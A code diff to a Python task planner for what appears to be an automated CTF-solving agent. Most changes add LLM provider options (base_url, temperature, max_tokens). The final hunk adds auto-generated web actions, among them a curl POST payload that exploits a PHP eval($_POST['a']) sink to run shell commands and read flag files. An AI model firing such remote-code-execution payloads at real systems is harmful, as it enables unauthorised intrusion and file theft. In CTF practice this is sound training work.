@@ -155,10 +155,21 @@ Output ONLY valid JSON:
 class Planner:
     """LLM-powered task planner with async support and few-shot learning."""
 
-    def __init__(self, model: str = "gpt-4o", provider: str = "openai", api_key: Optional[str] = None):
+    def __init__(
+        self,
+        model: str = "gpt-4o",
+        provider: str = "openai",
+        api_key: Optional[str] = None,
+        base_url: Optional[str] = None,
+        temperature: float = 0.1,
+        max_tokens: int = 4096,
+    ):
         self.model = model
         self.provider = provider
         self.api_key = api_key
+        self.base_url = base_url.rstrip("/") if isinstance(base_url, str) and base_url.strip() else None
+        self.temperature = temperature
+        self.max_tokens = max_tokens
         self._client = None
         self._llm_disabled_reason: Optional[str] = None
 
@@ -166,16 +177,24 @@ class Planner:
         if self._client is None:
             if self.provider == "openai":
                 from openai import OpenAI
-                self._client = OpenAI(api_key=self.api_key)
+                kwargs = {"api_key": self.api_key}
+                if self.base_url:
+                    kwargs["base_url"] = self.base_url
+                self._client = OpenAI(**kwargs)
             elif self.provider == "anthropic":
                 import anthropic
                 self._client = anthropic.Anthropic(api_key=self.api_key)
             elif self.provider == "deepseek":
                 from openai import OpenAI
-                self._client = OpenAI(api_key=self.api_key, base_url="https://api.deepseek.com/v1")
+                self._client = OpenAI(api_key=self.api_key, base_url=self.base_url or "https://api.deepseek.com/v1")
             elif self.provider == "ollama":
                 from openai import OpenAI
-                self._client = OpenAI(api_key="ollama", base_url="http://localhost:11434/v1")
+                self._client = OpenAI(api_key=self.api_key or "ollama", base_url=self.base_url or "http://localhost:11434/v1")
+            elif self.provider in {"openai-compatible", "mimo"}:
+                from openai import OpenAI
+                if not self.base_url:
+                    raise ValueError("provider requires llm.base_url")
+                self._client = OpenAI(api_key=self.api_key, base_url=self.base_url)
             else:
                 raise ValueError(f"Unsupported provider: {self.provider}")
         return self._client
@@ -208,14 +227,14 @@ Output ONLY valid JSON."""
         client = self._get_client()
         if self.provider == "anthropic":
             response = client.messages.create(
-                model=self.model, max_tokens=4096, temperature=0.1,
+                model=self.model, max_tokens=self.max_tokens, temperature=self.temperature,
                 system=system_prompt,
                 messages=[{"role": "user", "content": user_prompt}],
             )
             return response.content[0].text
         else:
             response = client.chat.completions.create(
-                model=self.model, temperature=0.1, max_tokens=4096,
+                model=self.model, temperature=self.temperature, max_tokens=self.max_tokens,
                 messages=[
                     {"role": "system", "content": system_prompt},
                     {"role": "user", "content": user_prompt},
@@ -316,6 +335,16 @@ Output ONLY valid JSON."""
         actions = []
         if url:
             quoted_url = shlex.quote(url)
+            post_rce = (
+                f"curl -s --max-time 10 -X POST --data-urlencode "
+                f"{shlex.quote('a=echo \"CTF_AGENT_RCE:\"; system(\"id; pwd; ls -la; cat /flag 2>/dev/null; cat flag 2>/dev/null; cat flag.php 2>/dev/null; cat get_flag.php 2>/dev/null\");')}"
+                f" {quoted_url}"
+            )
+            post_probe = (
+                f"curl -s --max-time 10 -X POST --data-urlencode "
+                f"{shlex.quote('a=echo \"CTF_AGENT_PROBE\";')}"
+                f" {quoted_url}"
+            )
             robots_url = shlex.quote(urljoin(url.rstrip("/") + "/", "robots.txt"))
             flag_url = shlex.quote(urljoin(url.rstrip("/") + "/", "flag.txt"))
             actions.append(Action(
@@ -328,6 +357,16 @@ Output ONLY valid JSON."""
             ))
             if category == "web":
                 actions.extend([
+                    Action(
+                        tool="curl",
+                        command=post_probe,
+                        description="Probe common PHP eval POST parameter 'a'",
+                    ),
+                    Action(
+                        tool="curl",
+                        command=post_rce,
+                        description="Exploit visible PHP eval($_POST['a']) sink to read common flag paths",
+                    ),
                     Action(
                         tool="curl",
                         command=f"curl -s --max-time 10 {robots_url}",
